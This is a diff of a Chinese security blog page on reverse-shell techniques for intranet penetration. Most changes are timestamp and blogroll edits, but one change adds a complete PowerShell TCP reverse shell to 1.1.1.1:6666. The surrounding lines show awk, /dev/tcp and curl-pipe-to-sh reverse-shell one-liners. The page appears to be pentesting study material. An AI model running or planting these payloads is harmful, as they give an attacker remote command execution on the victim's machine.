@@ -131,7 +131,7 @@
 <meta property="og:description" content="主要反弹方式 首先vps监听：nc –l –vv –p port">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/18.2.jpg">
-<meta property="og:updated_time" content="2019-04-16T11:42:56.033Z">
+<meta property="og:updated_time" content="2019-07-29T11:59:13.937Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网渗透之反弹shell的几种姿势">
 <meta name="twitter:description" content="主要反弹方式 首先vps监听：nc –l –vv –p port">
@@ -497,7 +497,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-04-16 19:42:56" itemprop="dateModified" datetime="2019-04-16T19:42:56+08:00">2019-04-16</time>
+                <time title="Modified: 2019-07-29 19:59:13" itemprop="dateModified" datetime="2019-07-29T19:59:13+08:00">2019-07-29</time>
               
             
           </span>
@@ -574,6 +574,7 @@
 <p><strong>11、awk</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.1.128/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&apos;</span><br></pre></td></tr></table></figure></p>
 <p><strong>12、其他</strong><br><code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ip/port;sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></p>
 <p><code>curl https://x.x.sh/ip:port | sh</code></p>
+<p><code>powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&#39;1.1.1.1&#39;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.UTF8Encoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::UTF8).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></p>
 <p>参考链接：<br><span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy9zeXN0ZW0vMTQ3NzY4Lmh0bWw=" title="http://www.freebuf.com/articles/system/147768.html">http://www.freebuf.com/articles/system/147768.html<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcjAwdGdyb2svcC9yZXZlcnNlX3NoZWxsX2NoZWF0c2hlZXQuaHRtbA==" title="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html<i class="fa fa-external-link"></i></span></p>
 
       
@@ -1008,6 +1009,10 @@
                 
                   <li class="links-of-blogroll-item">
                     <span class="exturl" data-url="aHR0cDovL3FjbG92ZXIuY24=" title="http://qclover.cn">华清(Qclover)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cHM6Ly9sb25lbHlzZWMuY29tLw==" title="https://lonelysec.com/">薯片(CK)</span>
                   </li>
                 
               </ul>
